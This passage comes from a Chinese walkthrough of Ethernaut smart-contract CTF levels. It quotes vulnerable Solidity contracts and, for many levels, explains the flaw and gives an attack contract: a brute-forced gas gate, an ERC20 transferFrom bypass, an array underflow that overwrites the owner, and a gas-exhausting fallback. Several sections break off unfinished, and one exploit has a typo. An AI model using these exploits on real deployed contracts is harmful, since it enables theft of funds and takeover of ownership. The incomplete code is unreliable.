parameter        bytes32[3] memory data = [            bytes32(&quot;Some data 1&quot;),            bytes32(&quot;Some data 2&quot;),            bytes32(&quot;Some data 3&quot;)        ];                privacyInstance = new Privacy(data);    &#125;&#125;\n接着要使locked改变，只有调用unlock函数，提供一个bytes16的_key且与_data数组的第三个参数匹配。\n简单回顾一下智能合约中状态变量是如何存储的：\n在合约内部定义状态变量的顺序决定了变量存储在EVM中的字节值。每个slot能存储32字节的数据，在没存储满时允许不超过剩余存储字节的变量接着往后存储。不然开辟新的slot空间存储变量。\n在本题中，首先定义了一个bool变量，占slot0的位置。接下来uint256的ID一共32字节因此在slot1的位置；接着是两个1字节和一个2字节的uint变量都位于slot2的位置，于是bytes32数组的存储位置便在slot3、slot4、slot5。\n而unlock需要的参数便是数组的第三个参数即slot5存储的数据，我们直接用web3中提供的方法获取到便行。然后截取前16字节。\nweb3.eth.getStorageAt(&quot;youraddr&quot;,5)然后.slice(0,34)因为前两位是0x，同是2字符表示1字节，16*2+2=34。\n\nGatekeeper One任务要求：成为entrant\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperOne &#123;  address public entrant;  modifier gateOne() &#123;    require(msg.sender != tx.origin);    _;  &#125;  modifier gateTwo() &#123;    require(gasleft() % 8191 == 0);    _;  &#125;  modifier gateThree(bytes8 _gateKey) &#123;      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);    _;  &#125;  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;    entrant = tx.origin;    return true;  &#125;&#125;\n要成为entrant，我们只有调用enter方法且满足gateOne，gateTwo，gateThree三个修饰符。现在让我们逐步分析三个修饰符：\n\ngateOne：要求调用者不是外部账户本身，因此，我们需要使用一个合约来调用Gatekeeper的enter函数。\ngateTwo：要求当前交易的剩余燃气量（gasleft()）必须是 8191 的倍数。\ngateThree：传入一个bytes8类型的_gateKey参数。\n第一个条件要求_gateKey的低 32 位等于其低 16 位。\n第二个条件要求_gateKey的低 32 位不等于其低 64 位。\n第三个条件要求_gateKey的低 32 位等于调用者的低 20 位。\n\n\n\n遇到这种构造类题目，从最难的条件开始往前推更一目了然。例如对这道题的分析，第一个修饰符只要我们从另一个合约调用enter方法，因此至少想到攻击合约需要有GatekeeperOne(target).enter(xxx)这样的语句，\n接着第二点需要gasleft()，这没有办法知道答案，只有靠暴力测试一个一个试。\n第三点，满足三个子条件，对于数据转换较多的时候，进行类似因式分解的提取操作能使代码更简洁。这里我们把uint64(_gateKey)替换成一个k，满足条件就为：\n\nuint32(k) &#x3D;&#x3D; uint16(k)\nuint32(k) !&#x3D; k\nuint32(k) &#x3D;&#x3D; uint16(uint160(tx.origin))\n\n这样，我们只着重于构造一个满足上述式子的k值就大功告成了。\n继续分析，从最难的开始：uint32(k) &#x3D;&#x3D; uint16(uint160(tx.origin))，只需要构造一个：uint16 k16 = uint16(uint160(tx.origin))就能满足\n同时，这个k16的值恰好满足uint32(k) == uint16(k)，那我们接着进行第二点：uint32(k) !&#x3D; k，因为我们最后传入的值是bytes8，那么这里用uint64就合适了，如果k的值大于2^32-1，那么在进行uint32强制转换时，它的高位都将被截断，保留低32位，这时uint32(k)将会失去一部分值导致uint32(k) !&#x3D; k。于是最终的k为uint64 k &#x3D; uint64(1 &lt;&lt; 63) + uint64(k16)。再将其转换为一个bytes8类型的数就是我们需要的_gateKey。\ncontract Hack &#123;  GatekeeperOne target;  event Gas(uint num);  constructor(address _target) &#123;    target = GatekeeperOne(_target);  &#125;  function enter(bytes8 key, uint gas) external &#123;    require(target.enter&#123;gas: 8191*10+gas&#125;(key));  &#125;  function Key() public view returns (bytes8) &#123;    uint16 k16 = uint16(uint160(tx.origin));    uint64 k64 = uint64(1 &lt;&lt; 63) + uint64(k16);    bytes8 key = bytes8(k64);    return key;  &#125;  function test(bytes8 key) public &#123;    for (uint i = 100; i &lt; 8191; i++)     &#123;      try target.enter&#123;gas: 8191*10+i&#125;(this.Key())  &#123;        emit Gas(i);        return ;      &#125; catch &#123;&#125;    &#125;    revert(&quot;all failed&quot;);  &#125;&#125;\n\n\nGatekeeper Tow任务要求：成为entrant\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperTwo &#123;  address public entrant;  modifier gateOne() &#123;    require(msg.sender != tx.origin);    _;  &#125;  modifier gateTwo() &#123;    uint x;    assembly &#123; x := extcodesize(caller()) &#125;    require(x == 0);    _;  &#125;  modifier gateThree(bytes8 _gateKey) &#123;    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);    _;  &#125;  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;    entrant = tx.origin;    return true;  &#125;&#125;\n同上一个挑战是同一种类型，因此直接分析enter执行条件：\n\ngateOne：要求使用合约调用。\ngateTwo：貌似要求msg.sender不是一个合约。\ngateThree：传入一个bytes8类型的_gateKey参数。\n\n直接分析，关于extcodesize()的部分可以看文章末尾，现在我们满足gateThree：uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)，一个计算式都看着又臭又长，但是不要怕，我们直接定义变量进行简化。\n首先对左边进行处理：uint64 x = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))注意，这里的msg.sender应该是我们的合约，因此要用address(this)进行替换，uint64(_gateKey)便是我们传入的值，定义为key，于是简化为：\nx ^ key == type(uint64).max，这样一个异或运算，同时我们知道在异或运算中：a ^ a ^ b = b\n而我们又可以有：x ^ x ^ key == key，这里的x ^ key又等于type(uint64).max，由此可得key = x ^ type(uint64).max\ncontract Hack &#123;  constructor(GatekeeperTwo target) &#123;    uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));        uint64 k64 = s ^ type(uint64).max;        bytes8 key = bytes8(k64);    target.enter(key);  &#125;&#125;\n\n\nextcodesize()\n\n\nNaughtCoin任务要求：通过转移走合约中的所有余额。\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#x27;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#x27;; contract NaughtCoin is ERC20 &#123;  // string public constant name = &#x27;NaughtCoin&#x27;;  // string public constant symbol = &#x27;0x0&#x27;;  // uint public constant decimals = 18;  uint public timeLock = block.timestamp + 10 * 365 days;  uint256 public INITIAL_SUPPLY;  address public player;  constructor(address _player)   ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123;    player = _player;    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));    // _totalSupply = INITIAL_SUPPLY;    // _balances[player] = INITIAL_SUPPLY;    _mint(player, INITIAL_SUPPLY);    emit Transfer(address(0), player, INITIAL_SUPPLY);  &#125;    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;    super.transfer(_to, _value);  &#125;  // Prevent the initial owner from transferring tokens until the timelock has passed  modifier lockTokens() &#123;    if (msg.sender == player) &#123;      require(block.timestamp &gt; timeLock);      _;    &#125; else &#123;     _;    &#125;  &#125; &#125; \n整个合约中只有transfer()一个函数进行余额转移，同时这个函数受到lockTokens的限制只能在十年后才可以调用。因此我们只能通过其他手段，\n合约导入了ERC20，所以对于代币的转移除了transfer还有transferfrom方法，只需要注意transfrom函数还需要额外的操作：approve。\n整个过程就是：在生成实例后，通过调用ERC20的approve批准将代币转移到攻击合约或其他地方，然后进行transferfrom调用。\ncontract Hack &#123;  function pwn(IERC20 coin) external &#123;    address player = NaughtCoin(address(coin)).player();    uint amount = coin.balanceOf(player);    coin.transferFrom(player, address(this), amount);  &#125;&#125;\n\n\nPreservation任务要求：拥有合约的所有权。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Preservation &#123;  // public library contracts   address public timeZone1Library;  address public timeZone2Library;  address public owner;   uint storedTime;  // Sets the function signature for delegatecall  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;    timeZone1Library = _timeZone1LibraryAddress;     timeZone2Library = _timeZone2LibraryAddress;     owner = msg.sender;  &#125;   // set the time for timezone 1  function setFirstTime(uint _timeStamp) public &#123;    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  &#125;  // set the time for timezone 2  function setSecondTime(uint _timeStamp) public &#123;    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123;  // stores a timestamp   uint storedTime;    function setTime(uint _time) public &#123;    storedTime = _time;  &#125;&#125;\n在合约中，只有在部署时初始化了owner状态，因此我们对于直接调用某个函数进行owner更新是没有办法的。\n先不要慌，来看看合约中还干了些什么：\n\nRecovery任务要求：从丢失的账户中找回代币。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Recovery &#123;  //generate tokens  function generateToken(string memory _name, uint256 _initialSupply) public &#123;    new SimpleToken(_name, msg.sender, _initialSupply);    &#125;&#125;contract SimpleToken &#123;  string public name;  mapping (address =&gt; uint) public balances;  // constructor  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;    name = _name;    balances[_creator] = _initialSupply;  &#125;  // collect ether in return for tokens  receive() external payable &#123;    balances[msg.sender] = msg.value * 10;  &#125;  // allow transfers of tokens  function transfer(address _to, uint _amount) public &#123;     require(balances[msg.sender] &gt;= _amount);    balances[msg.sender] = balances[msg.sender] - _amount;    balances[_to] = _amount;  &#125;  // clean up after ourselves  function destroy(address payable _to) public &#123;    selfdestruct(_to);  &#125;&#125;\n根据题目大意，在通过Recovery部署的一个SimpToken合约地址丢失了，该合约还含有0.001eth。因此，我们要做的就是1、找回SimpleToken合约的地址。2、回收其0.001ether。\n通过payable关键字可以查到SimpleToken合约中通过receive函数接受ether，同时通过destroy可以向外发送ether，因此只需要能够找到该合约地址并调用destroy方法，那么就能够通过挑战。\n那么怎么获得一个地址呢？首先我们可以接助区块链浏览器查询，但这样的效率太低。因此我们使用另一种办法：构造地址\n以太坊生成地址的逻辑：\n\nMagicNumber任务要求：构造一个合约，使其能够返回正确数字。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MagicNum &#123;  address public solver;  constructor() &#123;&#125;  function setSolver(address _solver) public &#123;    solver = _solver;  &#125;  /*    ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____             __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___             ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__             ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___             ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____             __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________             _\\///////////\\\\\\//____/\\\\\\/___________             ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_             ___________\\///_____\\///////////////__  */&#125;\n但题目中额外要求：要求不超过10opcodes，也就意味着我们不能通过常规的编写方法来完成这关。\n需要通过字节码来创建一个简单的智能合约，而在这个网站我找到了需要的字节码：Simple Bytecode Contract\ncontract Hack &#123;  constructor (MagicNum target) &#123;    address addr;    bytes memory bytecode = hex&quot;69602a60005260206000f3600052600a6016f3&quot;;    assembly &#123;      addr := create(0, add(bytecode, 0x20), 0x13)    &#125;    target.setSolver(addr);  &#125; &#125;\n\n\nAlice Codex任务要求：获得合约的所有权。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.5.0;import &#x27;../helpers/Ownable-05.sol&#x27;;contract AlienCodex is Ownable &#123;  bool public contact;  bytes32[] public codex;  modifier contacted() &#123;    assert(contact);    _;  &#125;    function makeContact() public &#123;    contact = true;  &#125;  function record(bytes32 _content) contacted public &#123;    codex.push(_content);  &#125;  function retract() contacted public &#123;    codex.length--;  &#125;  function revise(uint i, bytes32 _content) contacted public &#123;    codex[i] = _content;  &#125;&#125;\n合约继承ownable合约，这个合约的第一个状态变量就是address owner，因此我们要做的就是想办法override这个owner状态变量。\n在codex为0的时候调用retract，将会产生下溢，导致数组的长度变为2**256-1。\n我们再来分析一下storage中的存储状态，在调用retract之前，slot0 - owner（20bytes），contact（1byte），slot1 - length codex\n对于数组元素则是：slot h = codex[0],h=keccak256(1)，整个codex数组占了2**256个槽。\n因此我们要做的就是找到一个索引i，使得slot h+i =slot 0，也即是i&#x3D;-h这样的一个值，然后通过调用revise函数进行覆盖。\n通过调用makeContact()来使我们能够进行retract()、revise()操作。\ncontract Hack &#123;  constructor(AlienCodex target) &#123;    target.makeContact();    target.retract();    uint256 h = uint256(keccak256(abi.encode(uint256(1))));    uint256 i;    unchecked &#123;      i -= h;    &#125;    target.revise(i, byte32(uint256(uint160(msg.sender))));  &#125;&#125;\n\n\nDenial任务要求：拒绝owner进行提款。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Denial &#123;    address public partner; // withdrawal partner - pay the gas, split the withdraw    address public constant owner = address(0xA9E);    uint timeLastWithdrawn;    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances    function setWithdrawPartner(address _partner) public &#123;        partner = _partner;    &#125;    // withdraw 1% to recipient and 1% to owner    function withdraw() public &#123;        uint amountToSend = address(this).balance / 100;        // perform a call without checking return        // The recipient can revert, the owner will still get their share        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);        payable(owner).transfer(amountToSend);        // keep track of last withdrawal time        timeLastWithdrawn = block.timestamp;        withdrawPartnerBalances[partner] +=  amountToSend;    &#125;    // allow deposit of funds    receive() external payable &#123;&#125;    // convenience function    function contractBalance() public view returns (uint) &#123;        return address(this).balance;    &#125;&#125;\n当有人调用withdraw函数时，会将一些资金发送回所有者，我们要做到就是在partner地址中能够使交易回退，就可以保证后续的代码无法执行。\n仅仅通过revert()，我们无法拒绝提款，但可以通过消耗完gas，来拒绝交易进行。\n在solidity0.8.0版本之前，我们可以通过assembly(false)来消耗完所有的gas，在此之后assembly(false)不会消耗完所有的gas了，但可以通过汇编中的invalid()达到相同的效果：assembly&#123; invalid() &#125;\ncontract Hack &#123;  constructor(Denial target) &#123;    target.setWithdrawPartner(address(this));  &#125;  fallback() external payable &#123;     assembly&#123;      invalid()    &#125;  &#125;&#125;\n\n\nShop任务要求：想办法薅。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Buyer &#123;  function price() external view returns (uint);&#125;contract Shop &#123;  uint public price = 100;  bool public isSold;  function buy() public &#123;    Buyer _buyer = Buyer(msg.sender);    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;      isSold = true;      price = _buyer.price();    &#125;  &#125;&#125;\n因为合约对Buyer进行了两次price调用，那么我们可以在price函数中进行两次不同的操作，第一次正常大于价格，但在第二次调用时进行另一种逻辑，进行价格调整。\nview函数不能编写任何状态变量，通过自身的isSold进行条件判断。\ncontract Hack &#123;  Shop target;  constructor(address _tar) &#123;    target = Shop(_tar);  &#125;  function price() external view returns (uint) &#123;    if (!target.isSold()) &#123;      return 101;    &#125; else &#123;      return 0;    &#125;  &#125;  function pwn() external &#123;    target.buy();  &#125;&#125;\n\n\nDex任务要求：窃取token1,token2的资金。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;contract Dex is Ownable &#123;  address public token1;  address public token2;  constructor() &#123;&#125;  function setTokens(address _token1, address _token2) public onlyOwner &#123;    token1 = _token1;    token2 = _token2;  &#125;    function addLiquidity(address token_address, uint amount) public onlyOwner &#123;    IERC20(token_address).transferFrom(msg.sender, address(this), amount);  &#125;    function swap(address from, address to, uint amount) public &#123;    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);    uint swapAmount = getSwapPrice(from, to, amount);    IERC20(from).transferFrom(msg.sender, address(this), amount);    IERC20(to).approve(address(this), swapAmount);    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);  &#125;  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));  &#125;  function approve(address spender, uint amount) public &#123;    SwappableToken(token1).approve(msg.sender, spender, amount);    SwappableToken(token2).approve(msg.sender, spender, amount);  &#125;  function balanceOf(address token, address account) public view returns (uint)&#123;    return IERC20(token).balanceOf(account);  &#125;&#125;contract SwappableToken is ERC20 &#123;  address private _dex;  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;    _mint(msg.sender, initialSupply);    _dex = dexInstance;  &#125;  function approve(address owner, address spender, uint256 amount) public &#123;    require(owner != _dex, &quot;InvalidApprover&quot;);    super._approve(owner, spender, amount);  &#125;&#125;\n\n\nDex Two任务要求：从DexTwo合约中提取token1和token2的所有余额才能通过此题。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;contract DexTwo is Ownable &#123;  address public token1;  address public token2;  constructor() &#123;&#125;  function setTokens(address _token1, address _token2) public onlyOwner &#123;    token1 = _token1;    token2 = _token2;  &#125;  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;    IERC20(token_address).transferFrom(msg.sender, address(this), amount);  &#125;    function swap(address from, address to, uint amount) public &#123;    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);    uint swapAmount = getSwapAmount(from, to, amount);    IERC20(from).transferFrom(msg.sender, address(this), amount);    IERC20(to).approve(address(this), swapAmount);    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);  &#125;   function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));  &#125;  function approve(address spender, uint amount) public &#123;    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);  &#125;  function balanceOf(address token, address account) public view returns (uint)&#123;    return IERC20(token).balanceOf(account);  &#125;&#125;contract SwappableTokenTwo is ERC20 &#123;  address private _dex;  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;    _mint(msg.sender, initialSupply);    _dex = dexInstance;  &#125;  function approve(address owner, address spender, uint256 amount) public &#123;    require(owner != _dex, &quot;InvalidApprover&quot;);    super._approve(owner, spender, amount);  &#125;&#125;\n\n\nPuzzle Wallet任务要求：\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;pragma experimental ABIEncoderV2;import &quot;../helpers/UpgradeableProxy-08.sol&quot;;contract PuzzleProxy is UpgradeableProxy &#123;    address public pendingAdmin;    address public admin;    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;        admin = _admin;    &#125;    modifier onlyAdmin &#123;      require(msg.sender == admin, &quot;Caller is not the admin&quot;);      _;    &#125;    function proposeNewAdmin(address _newAdmin) external &#123;        pendingAdmin = _newAdmin;    &#125;    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);        admin = pendingAdmin;    &#125;    function upgradeTo(address _newImplementation) external onlyAdmin &#123;        _upgradeTo(_newImplementation);    &#125;&#125;contract PuzzleWallet &#123;    address public owner;    uint256 public maxBalance;    mapping(address =&gt; bool) public whitelisted;    mapping(address =&gt; uint256) public balances;    function init(uint256 _maxBalance) public &#123;        require(maxBalance == 0, &quot;Already initialized&quot;);        maxBalance = _maxBalance;        owner = msg.sender;    &#125;    modifier onlyWhitelisted &#123;        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);        _;    &#125;    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);      maxBalance = _maxBalance;    &#125;    function addToWhitelist(address addr) external &#123;        require(msg.sender == owner, &quot;Not the owner&quot;);        whitelisted[addr] = true;    &#125;    function deposit() external payable onlyWhitelisted &#123;      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);      balances[msg.sender] += msg.value;    &#125;    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);        balances[msg.sender] -= value;        (bool success, ) = to.call&#123; value: value &#125;(data);        require(success, &quot;Execution failed&quot;);    &#125;    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;        bool depositCalled = false;        for (uint256 i = 0; i &lt; data.length; i++) &#123;            bytes memory _data = data[i];            bytes4 selector;            assembly &#123;                selector := mload(add(_data, 32))            &#125;            if (selector == this.deposit.selector) &#123;                require(!depositCalled, &quot;Deposit can only be called once&quot;);                // Protect against reusing msg.value                depositCalled = true;            &#125;            (bool success, ) = address(this).delegatecall(data[i]);            require(success, &quot;Error while delegating call&quot;);        &#125;    &#125;&#125;\n\n\nMotorbike任务要求：\n源代码\n// SPDX-License-Identifier: MITpragma solidity &lt;0.7.0;import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;contract Motorbike &#123;    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;        struct AddressSlot &#123;        address value;    &#125;        // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.    constructor(address _logic) public &#123;        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;        (bool success,) = _logic.delegatecall(            abi.encodeWithSignature(&quot;initialize()&quot;)        );        require(success, &quot;Call failed&quot;);    &#125;    // Delegates the current call to `implementation`.    function _delegate(address implementation) internal virtual &#123;        // solhint-disable-next-line no-inline-assembly        assembly &#123;            calldatacopy(0, 0, calldatasize())            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)            returndatacopy(0, 0, returndatasize())            switch result            case 0 &#123; revert(0, returndatasize()) &#125;            default &#123; return(0, returndatasize()) &#125;        &#125;    &#125;    // Fallback function that delegates calls to the address returned by `_implementation()`.     // Will run if no other function in the contract matches the call data    fallback () external payable virtual &#123;        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);    &#125;    // Returns an `AddressSlot` with member `value` located at `slot`.    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;        assembly &#123;            r_slot := slot        &#125;    &#125;&#125;contract Engine is Initializable &#123;    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;    address public upgrader;    uint256 public horsePower;    struct AddressSlot &#123;        address value;    &#125;    function initialize() external initializer &#123;        horsePower = 1000;        upgrader = msg.sender;    &#125;    // Upgrade the implementation of the proxy to `newImplementation`    // subsequently execute the function call    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;        _authorizeUpgrade();        _upgradeToAndCall(newImplementation, data);    &#125;    // Restrict to upgrader role    function _authorizeUpgrade() internal view &#123;        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);    &#125;    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.    function _upgradeToAndCall(        address newImplementation,        bytes memory data    ) internal &#123;        // Initial upgrade and setup call        _setImplementation(newImplementation);        if (data.length &gt; 0) &#123;            (bool success,) = newImplementation.delegatecall(data);            require(success, &quot;Call failed&quot;);        &#125;    &#125;        // Stores a new address in the EIP1967 implementation slot.    function _setImplementation(address newImplementation) private &#123;        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);                AddressSlot storage r;        assembly &#123;            r_slot := _IMPLEMENTATION_SLOT        &#125;        r.value = newImplementation;    &#125;&#125;\n\n\nDoubleEntryPoint任务要求：\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;interface DelegateERC20 &#123;  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);&#125;interface IDetectionBot &#123;    function handleTransaction(address user, bytes calldata msgData) external;&#125;interface IForta &#123;    function setDetectionBot(address detectionBotAddress) external;    function notify(address user, bytes calldata msgData) external;    function raiseAlert(address user) external;&#125;contract Forta is IForta &#123;  mapping(address =&gt; IDetectionBot) public usersDetectionBots;  mapping(address =&gt; uint256) public botRaisedAlerts;  function setDetectionBot(address detectionBotAddress) external override &#123;      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);  &#125;  function notify(address user, bytes calldata msgData) external override &#123;    if(address(usersDetectionBots[user]) == address(0)) return;    try usersDetectionBots[user].handleTransaction(user, msgData) &#123;        return;    &#125; catch &#123;&#125;  &#125;  function raiseAlert(address user) external override &#123;      if(address(usersDetectionBots[user]) != msg.sender) return;      botRaisedAlerts[msg.sender] += 1;  &#125; &#125;contract CryptoVault &#123;    address public sweptTokensRecipient;    IERC20 public underlying;    constructor(address recipient) &#123;        sweptTokensRecipient = recipient;    &#125;    function setUnderlying(address latestToken) public &#123;        require(address(underlying) == address(0), &quot;Already set&quot;);        underlying = IERC20(latestToken);    &#125;    /*    ...    */    function sweepToken(IERC20 token) public &#123;        require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;);        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));    &#125;&#125;contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123;    DelegateERC20 public delegate;    function mint(address to, uint256 amount) public onlyOwner &#123;        _mint(to, amount);    &#125;    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123;        delegate = newContract;    &#125;    function transfer(address to, uint256 value) public override returns (bool) &#123;        if (address(delegate) == address(0)) &#123;            return super.transfer(to, value);        &#125; else &#123;            return delegate.delegateTransfer(to, value, msg.sender);        &#125;    &#125;&#125;contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123;    address public cryptoVault;    address public player;    address public delegatedFrom;    Forta public forta;    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123;        delegatedFrom = legacyToken;        forta = Forta(fortaAddress);        player = playerAddress;        cryptoVault = vaultAddress;        _mint(cryptoVault, 100 ether);    &#125;    modifier onlyDelegateFrom() &#123;        require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;);        _;    &#125;    modifier fortaNotify() &#123;        address detectionBot = address(forta.usersDetectionBots(player));        // Cache old number of bot alerts        uint256 previousValue = forta.botRaisedAlerts(detectionBot);        // Notify Forta        forta.notify(player, msg.data);        // Continue execution        _;        // Check if alarms have been raised        if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);    &#125;    function delegateTransfer(        address to,        uint256 value,        address origSender    ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;        _transfer(origSender, to, value);        return true;    &#125;&#125;\n\n\nGoodSamaritan任务要求：拿走所有的钱。\n源代码\n// SPDX-License-Identifier: MITpragma solidity &gt;=0.8.0 &lt;0.9.0;import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;;contract GoodSamaritan &#123;    Wallet public wallet;    Coin public coin;    constructor() &#123;        wallet = new Wallet();        coin = new Coin(address(wallet));        wallet.setCoin(coin);    &#125;    function requestDonation() external returns(bool enoughBalance)&#123;        // donate 10 coins to requester        try wallet.donate10(msg.sender) &#123;            return true;        &#125; catch (bytes memory err) &#123;            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123;                // send the coins left                wallet.transferRemainder(msg.sender);                return false;            &#125;        &#125;    &#125;&#125;contract Coin &#123;    using Address for address;    mapping(address =&gt; uint256) public balances;    error InsufficientBalance(uint256 current, uint256 required);    constructor(address wallet_) &#123;        // one million coins for Good Samaritan initially        balances[wallet_] = 10**6;    &#125;    function transfer(address dest_, uint256 amount_) external &#123;        uint256 currentBalance = balances[msg.sender];        // transfer only occurs if balance is enough        if(amount_ &lt;= currentBalance) &#123;            balances[msg.sender] -= amount_;            balances[dest_] += amount_;            if(dest_.isContract()) &#123;                // notify contract                 INotifyable(dest_).notify(amount_);            &#125;        &#125; else &#123;            revert InsufficientBalance(currentBalance, amount_);        &#125;    &#125;&#125;contract Wallet &#123;    // The owner of the wallet instance    address public owner;    Coin public coin;    error OnlyOwner();    error NotEnoughBalance();    modifier onlyOwner() &#123;        if(msg.sender != owner) &#123;            revert OnlyOwner();        &#125;        _;    &#125;    constructor() &#123;        owner = msg.sender;    &#125;    function donate10(address dest_) external onlyOwner &#123;        // check balance left        if (coin.balances(address(this)) &lt; 10) &#123;            revert NotEnoughBalance();        &#125; else &#123;            // donate 10 